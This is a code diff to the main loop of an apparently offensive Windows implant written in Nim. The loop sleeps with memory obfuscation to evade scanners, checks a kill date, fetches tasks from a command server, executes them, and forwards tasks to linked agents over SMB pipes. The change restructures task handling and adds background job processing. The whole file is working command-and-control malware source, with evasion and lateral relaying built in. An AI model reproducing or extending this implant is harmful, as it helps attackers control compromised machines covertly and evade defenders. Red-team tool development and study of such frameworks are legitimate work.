@@ -1,7 +1,7 @@
 import winim/lean
 import times, system, random, strformat, tables
-import core/[context, sleepmask, exit, transport]
 import utils/io
+import core/[context, sleepmask, exit, transport, job]
 import core/transport/smb
 import protocol/[task, result, registration]
 import ../../common/[utils, crypto, serialize]
@@ -28,6 +28,7 @@ proc agentMain() =
     while true: 
         try: 
             # Sleep obfuscation to evade memory scanners
+            print ""
             sleepObfuscate(ctx.sleepSettings)
 
             # Check kill date and exit the agent process if it is reached
@@ -50,7 +51,7 @@ proc agentMain() =
                     continue
 
             let date: string = now().format(protect("dd-MM-yyyy HH:mm:ss"))
-            print "\n", fmt"[*] [{date}] Checking in."
+            print fmt"[*] [{date}] Checking in."
 
             # Check if there are results of linked agents that need to be returned
             for agentId, hPipe in ctx.links: 
@@ -58,55 +59,53 @@ proc agentMain() =
                 if resultBytes.len() > 0:
                     ctx.sendData(string.toBytes(resultBytes))
 
-            # Retrieve task queue for the current agent by sending a check-in/heartbeat request
-            # The check-in request contains the agentId and listenerId, so the server knows which tasks to return
-            let packet: string = ctx.getTasks()
-            if packet.len <= 0: 
-                print protect("[*] No tasks to execute.") 
-                continue
-
-            var tasks: Table[string, seq[seq[byte]]] = ctx.deserializePacket(packet)
-            if tasks.len <= 0: 
-                print protect("[*] No tasks to execute.")
-                continue
-
-            # Handle task execution
+            # Package result data (pending jobs & task results)
             var packer = Packer.init()
             var numResults: int = 0
-            var directTasks = initTable[string, seq[seq[byte]]]() 
-            var indirectPacker = Packer.init()    
 
-            for agentId, agentTasks in tasks:
-                
-                # Execute tasks belonging to the current agent 
-                if agentId == ctx.agentId:
-                    for task in agentTasks:
-                        var result: TaskResult = ctx.handleTask(ctx.deserializeTask(task))
-                        let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
-                        inc numResults
-                        packer.addDataWithLengthPrefix(resultBytes)
+            # Handle tasks
+            let packet: string = ctx.getTasks()
+            if packet.len > 0:
+                var tasks: Table[string, seq[seq[byte]]] = ctx.deserializePacket(packet)
+                if tasks.len > 0:
+                    var directTasks = initTable[string, seq[seq[byte]]]() 
+                    var indirectPacker = Packer.init()    
 
-                # If the task is for a direct child it is not forwarded to all linked agents, only to the one it is for
-                elif ctx.links.hasKey(string.toUuid(agentId)): 
-                    directTasks[agentId] = agentTasks
+                    for agentId, agentTasks in tasks:
+                        # Execute tasks belonging to the current agent 
+                        if agentId == ctx.agentId:
+                            for task in agentTasks:
+                                var result: TaskResult = ctx.handleTask(ctx.deserializeTask(task))
+                                let resultBytes: seq[byte] = ctx.serializeTaskResult(result)
+                                inc numResults
+                                packer.addDataWithLengthPrefix(resultBytes)
 
-                # Pack tasks that need to be forwarded to linked agents
-                else: 
-                    indirectPacker.add(string.toUuid(agentId))
-                    indirectPacker.add(cast[uint8](agentTasks.len()))
-                    for task in agentTasks:
-                        indirectPacker.addDataWithLengthPrefix(task)
-    
-            let indirectTasks = indirectPacker.pack()
-            for linkedAgentId in ctx.links.keys:
-                let directTasks = directTasks.getOrDefault(Uuid.toString(linkedAgentId), @[])
+                        # If the task is for a direct child it is not forwarded to all linked agents, only to the one it is for
+                        elif ctx.links.hasKey(string.toUuid(agentId)): 
+                            directTasks[agentId] = agentTasks
 
-                # Forward direct and indirect tasks to the directly linked children
-                if directTasks.len() > 0 or indirectTasks.len() > 0:
-                    if ctx.forward(linkedAgentId, directTasks, indirectTasks):
-                        print fmt"   [+] Forwarding tasks to agent {Uuid.toString(linkedAgentId)}."
+                        # Pack tasks that need to be forwarded to linked agents
+                        else: 
+                            indirectPacker.add(string.toUuid(agentId))
+                            indirectPacker.add(cast[uint8](agentTasks.len()))
+                            for task in agentTasks:
+                                indirectPacker.addDataWithLengthPrefix(task)
 
-            ctx.sendData(@[uint8(numResults)] & packer.pack())
+                    # Forward direct and indirect tasks to the directly linked children
+                    let indirectTasks = indirectPacker.pack()
+                    for linkedAgentId in ctx.links.keys:
+                        let directTasks = directTasks.getOrDefault(Uuid.toString(linkedAgentId), @[])
+                        if directTasks.len() > 0 or indirectTasks.len() > 0:
+                            if ctx.forward(linkedAgentId, directTasks, indirectTasks):
+                                print fmt"   [+] Forwarding tasks to agent {Uuid.toString(linkedAgentId)}."
+
+            # Handle on-going jobs
+            print fmt"[*] {ctx.jobs.len()} jobs in progress." 
+            ctx.handleJobs(packer, numResults)
+
+            # Return results
+            if numResults > 0:
+                ctx.sendData(@[uint8(numResults)] & packer.pack())
 
         except CatchableError as err: 
             print protect("[-] "), err.msg
